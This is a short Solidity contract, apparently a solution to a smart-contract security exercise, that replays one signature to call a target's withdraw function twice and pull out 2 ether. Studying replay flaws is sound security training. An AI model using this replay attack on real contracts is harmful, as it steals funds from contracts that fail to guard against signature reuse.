// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface ISignatureReplay {
    function withdraw(address to, uint256 amount, bytes32 r, bytes32 s, uint8 v)
        external;
}

contract SignatureReplayExploit {
    ISignatureReplay immutable target;

    constructor(address _target) {
        target = ISignatureReplay(_target);
    }

    receive() external payable {}

    function pwn(bytes32 r, bytes32 s, uint8 v) external {
        // Write your code here
        target.withdraw(msg.sender, 1 ether, r, s, v);
        target.withdraw(msg.sender, 1 ether, r, s, v);
    }
}